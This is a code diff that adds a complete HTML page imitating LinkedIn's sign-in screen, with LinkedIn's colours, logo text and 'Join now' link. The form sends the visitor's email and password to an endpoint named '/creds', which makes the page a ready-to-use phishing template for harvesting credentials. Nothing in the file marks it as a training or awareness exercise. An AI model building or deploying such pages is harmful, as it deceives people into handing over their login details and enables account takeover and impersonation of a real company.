@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f3f2ef; margin: 0; padding: 20px; }
+        .container { max-width: 352px; margin: 0 auto; }
+        .logo { color: #0a66c2; font-size: 34px; font-weight: bold; text-align: center; margin-bottom: 20px; }
+        .card { background: #fff; padding: 24px; border-radius: 8px; box-shadow: 0 0 0 1px rgba(0,0,0,0.1); }
+        h1 { font-size: 20px; margin-bottom: 24px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #000; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #0a66c2; color: #fff; border: none; border-radius: 20px; font-size: 16px; cursor: pointer; }
+        .join { text-align: center; margin-top: 20px; }
+        .join a { color: #0a66c2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Linkedin</div>
+        <div class="card">
+            <h1>Sign in</h1>
+            <form action="/creds" method="POST">
+                <input type="text" name="email" placeholder="Email or phone" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+        <div class="join">New to LinkedIn? <a href="#">Join now</a></div>
+    </div>
+</body>
+</html>
